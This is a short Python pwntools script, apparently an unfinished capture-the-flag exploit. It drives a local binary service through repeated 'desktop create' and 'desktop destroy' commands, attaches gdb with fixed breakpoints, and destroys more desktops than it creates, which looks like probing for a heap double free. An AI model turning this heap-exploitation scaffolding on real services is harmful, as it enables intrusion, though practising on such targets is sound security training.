from pwn import *
from struct import pack,unpack
import time

def create_desktop(name,description,width,height):
	print s.sendlineafter('$','desktop create')
	print s.sendlineafter('Name: ',name)
	print s.sendlineafter('Description: ',description)
	print s.sendlineafter('Width: ',width)
	print s.sendlineafter('Height: ',height)

def destroy_desktop():
	print s.sendlineafter('$','desktop destroy')

s = tubes.remote.remote('127.0.0.1', 4444)
gdb.attach(s, ''' b  *0x0000000000403bcb
		  b  *0x4028fe
		display /i $pc
		display /5xg 0x00000000006093D0''')
create_desktop('123','123','123','123')
create_desktop('123','123','123','123')
create_desktop('123','123','123','123')

destroy_desktop()
destroy_desktop()
destroy_desktop()
#create_desktop('a'*120,'a'*0x900,'123','123')
destroy_desktop()

s.interactive()
